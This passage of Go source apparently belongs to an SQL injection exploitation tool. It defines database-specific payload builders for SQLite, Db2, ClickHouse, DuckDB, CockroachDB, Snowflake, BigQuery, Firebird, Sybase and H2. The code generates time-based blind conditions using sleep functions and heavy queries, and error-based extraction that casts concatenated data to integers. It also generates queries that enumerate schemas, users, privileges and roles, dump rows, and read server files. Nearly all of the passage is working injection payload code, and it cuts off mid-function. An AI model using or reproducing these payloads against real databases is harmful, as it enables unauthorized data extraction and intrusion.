			return fmt.Sprintf("(SELECT GROUP_CONCAT(name,char(30)) FROM pragma_table_info(%s))", literal(table))
		},
		CurrentDB: func() string { return "'main'" },
		Version:   func() string { return "sqlite_version()" },
		User:      func() string { return "'sqlite'" },
		Hostname:  func() string { return "'localhost'" },
		IsDBA:     func() string { return "0" },
		Privileges: func() string {
			return "''"
		},
		Users: func() string {
			return "''"
		},
		Passwords: func() string {
			return "''"
		},
		Roles: func() string {
			return "''"
		},
		RowCount: func(ref TableRef, where string) string {
			return fmt.Sprintf("(SELECT COUNT(*) FROM %s%s)", quoteDouble(ref.Table), whereClause(where))
		},
		DumpRow: func(ref TableRef, cols []string, offset int, where string) string {
			parts := make([]string, 0, len(cols))
			for _, c := range cols {
				parts = append(parts, fmt.Sprintf("COALESCE(CAST(%s AS TEXT),'NULL')", quoteDouble(c)))
			}
			return fmt.Sprintf("(SELECT %s FROM %s%s LIMIT 1 OFFSET %d)", joinExpr(parts, "char(31)", true), quoteDouble(ref.Table), whereClause(where), offset)
		},
		FileRead: func(path string) (string, bool) {
			return fmt.Sprintf("readfile(%s)", literal(path)), true
		},
		OSCmd: func(cmd string) (string, bool) {
			return "", false
		},
		SearchTables: func(keyword string) string {
			return fmt.Sprintf("(SELECT GROUP_CONCAT(name,char(30)) FROM sqlite_master WHERE type='table' AND name LIKE %s)", literal("%"+keyword+"%"))
		},
		SearchColumns: func(keyword string) string {
			return "''"
		},
		TableColumns: func(db, schema, table string) string {
			return fmt.Sprintf("(SELECT GROUP_CONCAT(name||':'||type,char(30)) FROM pragma_table_info(%s))", literal(table))
		},
		AllTables: func() string {
			return "(SELECT GROUP_CONCAT(name,char(30)) FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%')"
		},
		AllColumns: func() string {
			return "''"
		},
	}
}

// --- IBM Db2 -------------------------------------------------------------

func db2Dialect() *Dialect {
	return &Dialect{
		Name:    "DB2",
		Aliases: defaultAliases("DB2", "IBM DB2", "Db2"),
		Quote:   quoteDouble,
		Str:     literal,
		Concat:  concatPipe,
		Length:  func(e string) string { return "LENGTH(" + e + ")" },
		Substr:  func(e string, p, l int) string { return fmt.Sprintf("SUBSTR(%s,%d,%d)", e, p, l) },
		ASCII:   func(e string) string { return "ASCII(" + e + ")" },
		Marker:  markerPipe,
		SleepExpr: func(n int) string {
			return fmt.Sprintf("SYSPROC.DBMS_LOCK.SLEEP(%d)", n)
		},
		TimeCondition: func(cond string, n int) string {
			return fmt.Sprintf("CASE WHEN (%s) THEN SYSPROC.DBMS_LOCK.SLEEP(%d) ELSE 1 END", cond, n)
		},
		ErrorExpr: func(expr string) (string, bool) {
			return fmt.Sprintf("1=CAST(CONCAT('~',(%s),'~') AS INTEGER)", expr), true
		},
		Databases: func() string {
			return "(SELECT LISTAGG(DBNAME,CHR(30)) WITHIN GROUP (ORDER BY DBNAME) FROM SYSCAT.DATABASES)"
		},
		Schemas: func(db string) string {
			return "(SELECT LISTAGG(SCHEMANAME,CHR(30)) WITHIN GROUP (ORDER BY SCHEMANAME) FROM SYSCAT.SCHEMATA WHERE SCHEMANAME NOT LIKE 'SYS%')"
		},
		Tables: func(db, schema string) string {
			if schema == "" {
				return "(SELECT LISTAGG(TABNAME,CHR(30)) WITHIN GROUP (ORDER BY TABNAME) FROM SYSCAT.TABLES WHERE TABSCHEMA=CURRENT SCHEMA AND TYPE='T')"
			}
			return fmt.Sprintf("(SELECT LISTAGG(TABNAME,CHR(30)) WITHIN GROUP (ORDER BY TABNAME) FROM SYSCAT.TABLES WHERE TABSCHEMA=%s AND TYPE='T')", literal(schema))
		},
		Columns: func(db, schema, table string) string {
			if schema == "" {
				return fmt.Sprintf("(SELECT LISTAGG(COLNAME,CHR(30)) WITHIN GROUP (ORDER BY COLNO) FROM SYSCAT.COLUMNS WHERE TABSCHEMA=CURRENT SCHEMA AND TABNAME=%s)", literal(table))
			}
			return fmt.Sprintf("(SELECT LISTAGG(COLNAME,CHR(30)) WITHIN GROUP (ORDER BY COLNO) FROM SYSCAT.COLUMNS WHERE TABSCHEMA=%s AND TABNAME=%s)", literal(schema), literal(table))
		},
		CurrentDB: func() string { return "CURRENT SERVER" },
		Version:   func() string { return "SERVICE_LEVEL" },
		User:      func() string { return "CURRENT_USER" },
		Hostname:  func() string { return "CURRENT SERVER" },
		IsDBA:     func() string { return "1" },
		Privileges: func() string {
			return "(SELECT LISTAGG(PRIVILEGE,CHR(30)) WITHIN GROUP (ORDER BY PRIVILEGE) FROM SYSIBM.SYSUSERAUTH)"
		},
		Users: func() string {
			return "(SELECT LISTAGG(GRANTEE,CHR(30)) WITHIN GROUP (ORDER BY GRANTEE) FROM SYSCAT.DBAUTH)"
		},
		Passwords: func() string {
			return "''"
		},
		Roles: func() string {
			return "(SELECT LISTAGG(ROLENAME,CHR(30)) WITHIN GROUP (ORDER BY ROLENAME) FROM SYSCAT.ROLES)"
		},
		RowCount: func(ref TableRef, where string) string {
			return fmt.Sprintf("(SELECT COUNT(*) FROM %s%s)", db2Table(ref), whereClause(where))
		},
		DumpRow: func(ref TableRef, cols []string, offset int, where string) string {
			parts := make([]string, 0, len(cols))
			for _, c := range cols {
				parts = append(parts, fmt.Sprintf("COALESCE(CAST(%s AS VARCHAR(32000)),'NULL')", quoteDouble(c)))
			}
			return fmt.Sprintf("(SELECT %s FROM %s%s ORDER BY 1 OFFSET %d ROWS FETCH NEXT 1 ROWS ONLY)", joinExpr(parts, "CHR(31)", true), db2Table(ref), whereClause(where), offset)
		},
		FileRead: func(path string) (string, bool) { return "", false },
		OSCmd:    func(cmd string) (string, bool) { return "", false },
		SearchTables: func(keyword string) string {
			return fmt.Sprintf("(SELECT LISTAGG(TABSCHEMA||'.'||TABNAME,CHR(30)) WITHIN GROUP (ORDER BY TABSCHEMA,TABNAME) FROM SYSCAT.TABLES WHERE TABNAME LIKE %s)", literal("%"+strings.ToUpper(keyword)+"%"))
		},
		SearchColumns: func(keyword string) string {
			return fmt.Sprintf("(SELECT LISTAGG(TABSCHEMA||'.'||TABNAME||'.'||COLNAME,CHR(30)) WITHIN GROUP (ORDER BY TABSCHEMA,TABNAME,COLNAME) FROM SYSCAT.COLUMNS WHERE COLNAME LIKE %s)", literal("%"+strings.ToUpper(keyword)+"%"))
		},
		TableColumns: func(db, schema, table string) string {
			if schema == "" {
				return fmt.Sprintf("(SELECT LISTAGG(COLNAME||':'||TYPENAME,CHR(30)) WITHIN GROUP (ORDER BY COLNO) FROM SYSCAT.COLUMNS WHERE TABSCHEMA=CURRENT SCHEMA AND TABNAME=%s)", literal(table))
			}
			return fmt.Sprintf("(SELECT LISTAGG(COLNAME||':'||TYPENAME,CHR(30)) WITHIN GROUP (ORDER BY COLNO) FROM SYSCAT.COLUMNS WHERE TABSCHEMA=%s AND TABNAME=%s)", literal(schema), literal(table))
		},
		AllTables: func() string {
			return "(SELECT LISTAGG(TABSCHEMA||'.'||TABNAME,CHR(30)) WITHIN GROUP (ORDER BY TABSCHEMA,TABNAME) FROM SYSCAT.TABLES WHERE TYPE='T')"
		},
		AllColumns: func() string {
			return "(SELECT LISTAGG(TABSCHEMA||'.'||TABNAME||'.'||COLNAME,CHR(30)) WITHIN GROUP (ORDER BY TABSCHEMA,TABNAME,COLNAME) FROM SYSCAT.COLUMNS)"
		},
	}
}

// --- ClickHouse ----------------------------------------------------------

func clickhouseDialect() *Dialect {
	return &Dialect{
		Name:    "ClickHouse",
		Aliases: defaultAliases("ClickHouse"),
		Quote:   quoteBacktick,
		Str:     literal,
		Concat:  concatFunc("concat"),
		Length:  func(e string) string { return "length(" + e + ")" },
		Substr:  func(e string, p, l int) string { return fmt.Sprintf("substring(%s,%d,%d)", e, p, l) },
		ASCII:   func(e string) string { return "ascii(" + e + ")" },
		Marker:  markerFunc,
		SleepExpr: func(n int) string {
			return fmt.Sprintf("sleep(%d)", n)
		},
		TimeCondition: func(cond string, n int) string {
			return fmt.Sprintf("CASE WHEN (%s) THEN sleep(%d) ELSE 0 END", cond, n)
		},
		ErrorExpr: func(expr string) (string, bool) {
			return fmt.Sprintf("1=toUInt8(CONCAT('~',(%s),'~'))", expr), true
		},
		Databases: func() string {
			return "(SELECT arrayStringConcat(groupArray(name), char(30)) FROM system.databases)"
		},
		Schemas: func(db string) string { return "" },
		Tables: func(db, schema string) string {
			if db == "" {
				return "(SELECT arrayStringConcat(groupArray(name), char(30)) FROM system.tables WHERE database=currentDatabase())"
			}
			return fmt.Sprintf("(SELECT arrayStringConcat(groupArray(name), char(30)) FROM system.tables WHERE database=%s)", literal(db))
		},
		Columns: func(db, schema, table string) string {
			if db == "" {
				return fmt.Sprintf("(SELECT arrayStringConcat(groupArray(name), char(30)) FROM system.columns WHERE database=currentDatabase() AND table=%s)", literal(table))
			}
			return fmt.Sprintf("(SELECT arrayStringConcat(groupArray(name), char(30)) FROM system.columns WHERE database=%s AND table=%s)", literal(db), literal(table))
		},
		CurrentDB: func() string { return "currentDatabase()" },
		Version:   func() string { return "version()" },
		User:      func() string { return "currentUser()" },
		Hostname:  func() string { return "hostName()" },
		IsDBA:     func() string { return "1" },
		Privileges: func() string {
			return "(SELECT arrayStringConcat(groupArray(privilege), char(30)) FROM system.grants)"
		},
		Users: func() string {
			return "(SELECT arrayStringConcat(groupArray(name), char(30)) FROM system.users)"
		},
		Passwords: func() string {
			return "''"
		},
		Roles: func() string {
			return "(SELECT arrayStringConcat(groupArray(name), char(30)) FROM system.roles)"
		},
		RowCount: func(ref TableRef, where string) string {
			return fmt.Sprintf("(SELECT count() FROM %s%s)", clickhouseTable(ref), whereClause(where))
		},
		DumpRow: func(ref TableRef, cols []string, offset int, where string) string {
			parts := make([]string, 0, len(cols))
			for _, c := range cols {
				parts = append(parts, fmt.Sprintf("ifNull(toString(%s),'NULL')", quoteBacktick(c)))
			}
			return fmt.Sprintf("(SELECT concat(%s) FROM %s%s LIMIT 1 OFFSET %d)", joinExpr(parts, "char(31)", false), clickhouseTable(ref), whereClause(where), offset)
		},
		FileRead: func(path string) (string, bool) {
			return fmt.Sprintf("file(%s)", literal(path)), true
		},
		OSCmd: func(cmd string) (string, bool) {
			return "", false
		},
		SearchTables: func(keyword string) string {
			return fmt.Sprintf("(SELECT arrayStringConcat(groupArray(concat(database,'.',name)), char(30)) FROM system.tables WHERE name LIKE %s)", literal("%"+keyword+"%"))
		},
		SearchColumns: func(keyword string) string {
			return fmt.Sprintf("(SELECT arrayStringConcat(groupArray(concat(database,'.',table,'.',name)), char(30)) FROM system.columns WHERE name LIKE %s)", literal("%"+keyword+"%"))
		},
		TableColumns: func(db, schema, table string) string {
			if db == "" {
				return fmt.Sprintf("(SELECT arrayStringConcat(groupArray(concat(name,':',type)), char(30)) FROM system.columns WHERE database=currentDatabase() AND table=%s)", literal(table))
			}
			return fmt.Sprintf("(SELECT arrayStringConcat(groupArray(concat(name,':',type)), char(30)) FROM system.columns WHERE database=%s AND table=%s)", literal(db), literal(table))
		},
		AllTables: func() string {
			return "(SELECT arrayStringConcat(groupArray(concat(database,'.',name)), char(30)) FROM system.tables)"
		},
		AllColumns: func() string {
			return "(SELECT arrayStringConcat(groupArray(concat(database,'.',table,'.',name)), char(30)) FROM system.columns)"
		},
	}
}

// --- DuckDB --------------------------------------------------------------

func duckdbDialect() *Dialect {
	d := postgresDialect()
	d.Name = "DuckDB"
	d.Aliases = defaultAliases("DuckDB")
	d.Databases = func() string { return "(SELECT string_agg(database_name,chr(30)) FROM duckdb_databases())" }
	d.Schemas = func(db string) string {
		return "(SELECT string_agg(schema_name,chr(30)) FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema','pg_catalog'))"
	}
	d.Tables = func(db, schema string) string {
		schema = strings.TrimSpace(schema)
		if schema == "" {
			schema = "main"
		}
		return fmt.Sprintf("(SELECT string_agg(table_name,chr(30)) FROM information_schema.tables WHERE table_schema=%s AND table_type='BASE TABLE')", literal(schema))
	}
	d.Columns = func(db, schema, table string) string {
		schema = strings.TrimSpace(schema)
		if schema == "" {
			schema = "main"
		}
		return fmt.Sprintf("(SELECT string_agg(column_name,chr(30)) FROM information_schema.columns WHERE table_schema=%s AND table_name=%s)", literal(schema), literal(table))
	}
	d.TableColumns = func(db, schema, table string) string {
		schema = strings.TrimSpace(schema)
		if schema == "" {
			schema = "main"
		}
		return fmt.Sprintf("(SELECT string_agg(column_name||':'||data_type,chr(30)) FROM information_schema.columns WHERE table_schema=%s AND table_name=%s)", literal(schema), literal(table))
	}
	d.CurrentDB = func() string { return "current_database()" }
	d.Version = func() string { return "version()" }
	d.User = func() string { return "current_user" }
	d.Hostname = func() string { return "'localhost'" }
	d.IsDBA = func() string { return "1" }
	d.RowCount = func(ref TableRef, where string) string {
		return fmt.Sprintf("(SELECT COUNT(*) FROM %s%s)", duckdbTable(ref), whereClause(where))
	}
	d.DumpRow = func(ref TableRef, cols []string, offset int, where string) string {
		parts := make([]string, 0, len(cols))
		for _, c := range cols {
			parts = append(parts, fmt.Sprintf("COALESCE(CAST(%s AS VARCHAR),'NULL')", quoteDouble(c)))
		}
		return fmt.Sprintf("(SELECT %s FROM %s%s LIMIT 1 OFFSET %d)", joinExpr(parts, "chr(31)", true), duckdbTable(ref), whereClause(where), offset)
	}
	return d
}

// --- CockroachDB ---------------------------------------------------------

func cockroachDialect() *Dialect {
	d := postgresDialect()
	d.Name = "CockroachDB"
	d.Aliases = defaultAliases("CockroachDB", "Cockroach", "CRDB")
	d.Databases = func() string {
		return "(SELECT string_agg(database_name,chr(30)) FROM [SHOW DATABASES])"
	}
	d.Schemas = func(db string) string {
		return "(SELECT string_agg(schema_name,chr(30)) FROM information_schema.schemata WHERE schema_name NOT IN ('pg_catalog','information_schema','crdb_internal'))"
	}
	d.Tables = func(db, schema string) string {
		schema = strings.TrimSpace(schema)
		if schema == "" {
			schema = "public"
		}
		return fmt.Sprintf("(SELECT string_agg(table_name,chr(30)) FROM information_schema.tables WHERE table_schema=%s AND table_type='BASE TABLE')", literal(schema))
	}
	d.Columns = func(db, schema, table string) string {
		schema = strings.TrimSpace(schema)
		if schema == "" {
			schema = "public"
		}
		return fmt.Sprintf("(SELECT string_agg(column_name,chr(30)) FROM information_schema.columns WHERE table_schema=%s AND table_name=%s)", literal(schema), literal(table))
	}
	d.CurrentDB = func() string { return "current_database()" }
	d.Version = func() string { return "version()" }
	return d
}

// --- Snowflake -----------------------------------------------------------

func snowflakeDialect() *Dialect {
	return &Dialect{
		Name:    "Snowflake",
		Aliases: defaultAliases("Snowflake"),
		Quote:   quoteDouble,
		Str:     literal,
		Concat:  concatFunc("CONCAT"),
		Length:  func(e string) string { return "LENGTH(" + e + ")" },
		Substr:  func(e string, p, l int) string { return fmt.Sprintf("SUBSTR(%s,%d,%d)", e, p, l) },
		ASCII:   func(e string) string { return "ASCII(" + e + ")" },
		Marker:  markerFunc,
		SleepExpr: func(n int) string {
			return fmt.Sprintf("SYSTEM$WAIT(%d)", n)
		},
		TimeCondition: func(cond string, n int) string {
			return fmt.Sprintf("CASE WHEN (%s) THEN SYSTEM$WAIT(%d) ELSE 1 END", cond, n)
		},
		ErrorExpr: func(expr string) (string, bool) {
			return fmt.Sprintf("1=CAST(CONCAT('~',(%s),'~') AS INT)", expr), true
		},
		Databases: func() string {
			return "(SELECT LISTAGG(database_name,CHAR(30)) WITHIN GROUP (ORDER BY database_name) FROM information_schema.databases)"
		},
		Schemas: func(db string) string {
			if db == "" {
				return "(SELECT LISTAGG(schema_name,CHAR(30)) WITHIN GROUP (ORDER BY schema_name) FROM information_schema.schemata WHERE schema_name <> 'INFORMATION_SCHEMA')"
			}
			return fmt.Sprintf("(SELECT LISTAGG(schema_name,CHAR(30)) WITHIN GROUP (ORDER BY schema_name) FROM %s.INFORMATION_SCHEMA.SCHEMATA WHERE schema_name <> 'INFORMATION_SCHEMA')", quoteDouble(db))
		},
		Tables: func(db, schema string) string {
			schema = strings.TrimSpace(schema)
			if schema == "" {
				schema = "PUBLIC"
			}
			if db == "" {
				return fmt.Sprintf("(SELECT LISTAGG(table_name,CHAR(30)) WITHIN GROUP (ORDER BY table_name) FROM information_schema.tables WHERE table_schema=%s)", literal(schema))
			}
			return fmt.Sprintf("(SELECT LISTAGG(table_name,CHAR(30)) WITHIN GROUP (ORDER BY table_name) FROM %s.INFORMATION_SCHEMA.TABLES WHERE table_schema=%s)", quoteDouble(db), literal(schema))
		},
		Columns: func(db, schema, table string) string {
			schema = strings.TrimSpace(schema)
			if schema == "" {
				schema = "PUBLIC"
			}
			if db == "" {
				return fmt.Sprintf("(SELECT LISTAGG(column_name,CHAR(30)) WITHIN GROUP (ORDER BY ordinal_position) FROM information_schema.columns WHERE table_schema=%s AND table_name=%s)", literal(schema), literal(table))
			}
			return fmt.Sprintf("(SELECT LISTAGG(column_name,CHAR(30)) WITHIN GROUP (ORDER BY ordinal_position) FROM %s.INFORMATION_SCHEMA.COLUMNS WHERE table_schema=%s AND table_name=%s)", quoteDouble(db), literal(schema), literal(table))
		},
		CurrentDB: func() string { return "CURRENT_DATABASE()" },
		Version:   func() string { return "CURRENT_VERSION()" },
		User:      func() string { return "CURRENT_USER()" },
		Hostname:  func() string { return "CURRENT_CLIENT()" },
		IsDBA:     func() string { return "1" },
		Privileges: func() string {
			return "(SELECT LISTAGG(role_name,CHAR(30)) WITHIN GROUP (ORDER BY role_name) FROM information_schema.applicable_roles)"
		},
		Users: func() string {
			return "(SELECT LISTAGG(name,CHAR(30)) WITHIN GROUP (ORDER BY name) FROM SNOWFLAKE.ACCOUNT_USAGE.USERS)"
		},
		Passwords: func() string {
			return "''"
		},
		Roles: func() string {
			return "(SELECT LISTAGG(role_name,CHAR(30)) WITHIN GROUP (ORDER BY role_name) FROM information_schema.applicable_roles)"
		},
		RowCount: func(ref TableRef, where string) string {
			return fmt.Sprintf("(SELECT COUNT(*) FROM %s%s)", snowflakeTable(ref), whereClause(where))
		},
		DumpRow: func(ref TableRef, cols []string, offset int, where string) string {
			parts := make([]string, 0, len(cols))
			for _, c := range cols {
				parts = append(parts, fmt.Sprintf("COALESCE(TO_VARCHAR(%s),'NULL')", quoteDouble(c)))
			}
			return fmt.Sprintf("(SELECT CONCAT(%s) FROM %s%s LIMIT 1 OFFSET %d)", joinExpr(parts, "CHAR(31)", false), snowflakeTable(ref), whereClause(where), offset)
		},
		FileRead: func(path string) (string, bool) {
			return "", false
		},
		OSCmd: func(cmd string) (string, bool) {
			return "", false
		},
		SearchTables: func(keyword string) string {
			return fmt.Sprintf("(SELECT LISTAGG(table_schema||'.'||table_name,CHAR(30)) WITHIN GROUP (ORDER BY table_schema,table_name) FROM information_schema.tables WHERE table_name LIKE %s)", literal("%"+strings.ToUpper(keyword)+"%"))
		},
		SearchColumns: func(keyword string) string {
			return fmt.Sprintf("(SELECT LISTAGG(table_schema||'.'||table_name||'.'||column_name,CHAR(30)) WITHIN GROUP (ORDER BY table_schema,table_name,column_name) FROM information_schema.columns WHERE column_name LIKE %s)", literal("%"+strings.ToUpper(keyword)+"%"))
		},
		TableColumns: func(db, schema, table string) string {
			schema = strings.TrimSpace(schema)
			if schema == "" {
				schema = "PUBLIC"
			}
			if db == "" {
				return fmt.Sprintf("(SELECT LISTAGG(column_name||':'||data_type,CHAR(30)) WITHIN GROUP (ORDER BY ordinal_position) FROM information_schema.columns WHERE table_schema=%s AND table_name=%s)", literal(schema), literal(table))
			}
			return fmt.Sprintf("(SELECT LISTAGG(column_name||':'||data_type,CHAR(30)) WITHIN GROUP (ORDER BY ordinal_position) FROM %s.INFORMATION_SCHEMA.COLUMNS WHERE table_schema=%s AND table_name=%s)", quoteDouble(db), literal(schema), literal(table))
		},
		AllTables: func() string {
			return "(SELECT LISTAGG(table_schema||'.'||table_name,CHAR(30)) WITHIN GROUP (ORDER BY table_schema,table_name) FROM information_schema.tables)"
		},
		AllColumns: func() string {
			return "(SELECT LISTAGG(table_schema||'.'||table_name||'.'||column_name,CHAR(30)) WITHIN GROUP (ORDER BY table_schema,table_name,column_name) FROM information_schema.columns)"
		},
	}
}

// --- BigQuery ------------------------------------------------------------

func bigqueryDialect() *Dialect {
	return &Dialect{
		Name:          "BigQuery",
		Aliases:       defaultAliases("BigQuery", "BQ", "Google BigQuery"),
		Quote:         quoteBacktick,
		Str:           literal,
		Concat:        concatFunc("CONCAT"),
		Length:        func(e string) string { return "LENGTH(" + e + ")" },
		Substr:        func(e string, p, l int) string { return fmt.Sprintf("SUBSTR(%s,%d,%d)", e, p, l) },
		ASCII:         func(e string) string { return "ASCII(" + e + ")" },
		Marker:        markerFunc,
		SleepExpr:     func(n int) string { return "0" },
		TimeCondition: func(cond string, n int) string { return "1" },
		ErrorExpr: func(expr string) (string, bool) {
			return fmt.Sprintf("1=CAST(CONCAT('~',(%s),'~') AS INT64)", expr), true
		},
		Databases: func() string {
			return "(SELECT STRING_AGG(schema_name,CHR(30)) FROM `region-us`.INFORMATION_SCHEMA.SCHEMATA)"
		},
		Schemas: func(db string) string { return "" },
		Tables: func(db, schema string) string {
			if db == "" {
				return "(SELECT STRING_AGG(table_name,CHR(30)) FROM INFORMATION_SCHEMA.TABLES)"
			}
			return fmt.Sprintf("(SELECT STRING_AGG(table_name,CHR(30)) FROM %s.INFORMATION_SCHEMA.TABLES)", quoteBacktick(db))
		},
		Columns: func(db, schema, table string) string {
			if db == "" {
				return fmt.Sprintf("(SELECT STRING_AGG(column_name,CHR(30)) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=%s)", literal(table))
			}
			return fmt.Sprintf("(SELECT STRING_AGG(column_name,CHR(30)) FROM %s.INFORMATION_SCHEMA.COLUMNS WHERE table_name=%s)", quoteBacktick(db), literal(table))
		},
		CurrentDB:  func() string { return "@@project_id" },
		Version:    func() string { return "@@version" },
		User:       func() string { return "SESSION_USER()" },
		Hostname:   func() string { return "'bigquery'" },
		IsDBA:      func() string { return "1" },
		Privileges: func() string { return "''" },
		Users:      func() string { return "''" },
		Passwords:  func() string { return "''" },
		Roles:      func() string { return "''" },
		RowCount: func(ref TableRef, where string) string {
			return fmt.Sprintf("(SELECT COUNT(*) FROM %s%s)", bigqueryTable(ref), whereClause(where))
		},
		DumpRow: func(ref TableRef, cols []string, offset int, where string) string {
			parts := make([]string, 0, len(cols))
			for _, c := range cols {
				parts = append(parts, fmt.Sprintf("COALESCE(CAST(%s AS STRING),'NULL')", quoteBacktick(c)))
			}
			return fmt.Sprintf("(SELECT CONCAT(%s) FROM %s%s LIMIT 1 OFFSET %d)", joinExpr(parts, "CHR(31)", false), bigqueryTable(ref), whereClause(where), offset)
		},
		FileRead: func(path string) (string, bool) { return "", false },
		OSCmd:    func(cmd string) (string, bool) { return "", false },
		SearchTables: func(keyword string) string {
			return fmt.Sprintf("(SELECT STRING_AGG(table_name,CHR(30)) FROM INFORMATION_SCHEMA.TABLES WHERE table_name LIKE %s)", literal("%"+keyword+"%"))
		},
		SearchColumns: func(keyword string) string {
			return fmt.Sprintf("(SELECT STRING_AGG(column_name,CHR(30)) FROM INFORMATION_SCHEMA.COLUMNS WHERE column_name LIKE %s)", literal("%"+keyword+"%"))
		},
		TableColumns: func(db, schema, table string) string {
			if db == "" {
				return fmt.Sprintf("(SELECT STRING_AGG(CONCAT(column_name,':',data_type),CHR(30)) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=%s)", literal(table))
			}
			return fmt.Sprintf("(SELECT STRING_AGG(CONCAT(column_name,':',data_type),CHR(30)) FROM %s.INFORMATION_SCHEMA.COLUMNS WHERE table_name=%s)", quoteBacktick(db), literal(table))
		},
		AllTables: func() string {
			return "(SELECT STRING_AGG(table_name,CHR(30)) FROM INFORMATION_SCHEMA.TABLES)"
		},
		AllColumns: func() string {
			return "(SELECT STRING_AGG(column_name,CHR(30)) FROM INFORMATION_SCHEMA.COLUMNS)"
		},
	}
}

// --- Firebird ------------------------------------------------------------

func firebirdDialect() *Dialect {
	return &Dialect{
		Name:    "Firebird",
		Aliases: defaultAliases("Firebird", "InterBase"),
		Quote:   quoteDouble,
		Str:     literal,
		Concat:  concatPipe,
		Length:  func(e string) string { return "CHAR_LENGTH(" + e + ")" },
		Substr:  func(e string, p, l int) string { return fmt.Sprintf("SUBSTRING(%s FROM %d FOR %d)", e, p, l) },
		ASCII:   func(e string) string { return "ASCII_VAL(" + e + ")" },
		Marker:  markerPipe,
		SleepExpr: func(n int) string {
			return "(SELECT COUNT(*) FROM rdb$database r1,rdb$database r2,rdb$database r3)"
		},
		TimeCondition: func(cond string, n int) string {
			return fmt.Sprintf("CASE WHEN (%s) THEN (SELECT COUNT(*) FROM rdb$database r1,rdb$database r2,rdb$database r3) ELSE 1 END", cond)
		},
		ErrorExpr: func(expr string) (string, bool) {
			return fmt.Sprintf("1=CAST(CONCAT('~',(%s),'~') AS INTEGER)", expr), true
		},
		Databases: func() string {
			return "(SELECT LIST(rdb$database_name,ASCII_CHAR(30)) FROM rdb$databases)"
		},
		Schemas: func(db string) string { return "" },
		Tables: func(db, schema string) string {
			return "(SELECT LIST(rdb$relation_name,ASCII_CHAR(30)) FROM rdb$relations WHERE rdb$system_flag=0)"
		},
		Columns: func(db, schema, table string) string {
			return fmt.Sprintf("(SELECT LIST(rdb$field_name,ASCII_CHAR(30)) FROM rdb$relation_fields WHERE rdb$relation_name=%s)", literal(strings.ToUpper(table)))
		},
		CurrentDB:  func() string { return "CURRENT_DATABASE" },
		Version:    func() string { return "rdb$get_context('SYSTEM','ENGINE_VERSION')" },
		User:       func() string { return "CURRENT_USER" },
		Hostname:   func() string { return "CURRENT_HOST" },
		IsDBA:      func() string { return "1" },
		Privileges: func() string { return "''" },
		Users:      func() string { return "''" },
		Passwords:  func() string { return "''" },
		Roles:      func() string { return "''" },
		RowCount: func(ref TableRef, where string) string {
			return fmt.Sprintf("(SELECT COUNT(*) FROM %s%s)", firebirdTable(ref), whereClause(where))
		},
		DumpRow: func(ref TableRef, cols []string, offset int, where string) string {
			parts := make([]string, 0, len(cols))
			for _, c := range cols {
				parts = append(parts, fmt.Sprintf("COALESCE(CAST(%s AS VARCHAR(4000)),'NULL')", quoteDouble(strings.ToUpper(c))))
			}
			return fmt.Sprintf("(SELECT %s FROM %s%s ROWS %d TO %d)", joinExpr(parts, "ASCII_CHAR(31)", true), firebirdTable(ref), whereClause(where), offset+1, offset+1)
		},
		FileRead: func(path string) (string, bool) { return "", false },
		OSCmd:    func(cmd string) (string, bool) { return "", false },
		SearchTables: func(keyword string) string {
			return fmt.Sprintf("(SELECT LIST(rdb$relation_name,ASCII_CHAR(30)) FROM rdb$relations WHERE rdb$relation_name LIKE %s)", literal("%"+strings.ToUpper(keyword)+"%"))
		},
		SearchColumns: func(keyword string) string {
			return fmt.Sprintf("(SELECT LIST(rdb$field_name,ASCII_CHAR(30)) FROM rdb$relation_fields WHERE rdb$field_name LIKE %s)", literal("%"+strings.ToUpper(keyword)+"%"))
		},
		TableColumns: func(db, schema, table string) string {
			return fmt.Sprintf("(SELECT LIST(rdb$field_name,ASCII_CHAR(30)) FROM rdb$relation_fields WHERE rdb$relation_name=%s)", literal(strings.ToUpper(table)))
		},
		AllTables: func() string {
			return "(SELECT LIST(rdb$relation_name,ASCII_CHAR(30)) FROM rdb$relations WHERE rdb$system_flag=0)"
		},
		AllColumns: func() string {
			return "(SELECT LIST(rdb$field_name,ASCII_CHAR(30)) FROM rdb$relation_fields)"
		},
	}
}

// --- Sybase ASE ----------------------------------------------------------

func sybaseDialect() *Dialect {
	d := mssqlDialect()
	d.Name = "Sybase"
	d.Aliases = defaultAliases("Sybase", "SQLAnywhere", "SAP ASE")
	d.Concat = concatPlus
	d.Version = func() string { return "@@VERSION" }
	d.Databases = func() string { return "(SELECT LIST(name,',') FROM sysdatabases)" }
	d.Schemas = func(db string) string { return "" }
	d.Tables = func(db, schema string) string {
		if db == "" {
			return "(SELECT LIST(name,',') FROM sysobjects WHERE type='U')"
		}
		return fmt.Sprintf("(SELECT LIST(name,',') FROM %s..sysobjects WHERE type='U')", quoteBracket(db))
	}
	d.Columns = func(db, schema, table string) string {
		if db == "" {
			return fmt.Sprintf("(SELECT LIST(name,',') FROM syscolumns WHERE id=OBJECT_ID(%s))", literal(table))
		}
		return fmt.Sprintf("(SELECT LIST(name,',') FROM %s..syscolumns WHERE id=OBJECT_ID(%s))", quoteBracket(db), literal(db+".."+table))
	}
	d.RowCount = func(ref TableRef, where string) string {
		return fmt.Sprintf("(SELECT COUNT(*) FROM %s%s)", sybaseTable(ref), whereClause(where))
	}
	d.DumpRow = func(ref TableRef, cols []string, offset int, where string) string {
		parts := make([]string, 0, len(cols))
		for _, c := range cols {
			parts = append(parts, fmt.Sprintf("ISNULL(CAST(%s AS VARCHAR(8000)),'NULL')", quoteBracket(c)))
		}
		// ASE has no portable OFFSET; TOP with a running total keeps the scalar
		// extraction valid and the explorer falls back to single-row batches.
		return fmt.Sprintf("(SELECT TOP 1 %s FROM %s%s)", joinExpr(parts, "CHAR(31)", false), sybaseTable(ref), whereClause(where))
	}
	return d
}

// --- H2 ------------------------------------------------------------------

func h2Dialect() *Dialect {
	return &Dialect{
		Name:    "H2",
		Aliases: defaultAliases("H2", "H2 Database"),
		Quote:   quoteDouble,
		Str:     literal,
		Concat:  concatFunc("CONCAT"),
		Length:  func(e string) string { return "LENGTH(" + e + ")" },
		Substr:  func(e string, p, l int) string { return fmt.Sprintf("SUBSTRING(%s,%d,%d)", e, p, l) },
		ASCII:   func(e string) string { return "ASCII(" + e + ")" },
		Marker:  markerFunc,
		SleepExpr: func(n int) string {
			return fmt.Sprintf("(SELECT COUNT(*) FROM SYSTEM_RANGE(1,%d))", 100000000*n/2)
		},
		TimeCondition: func(cond string, n int) string {
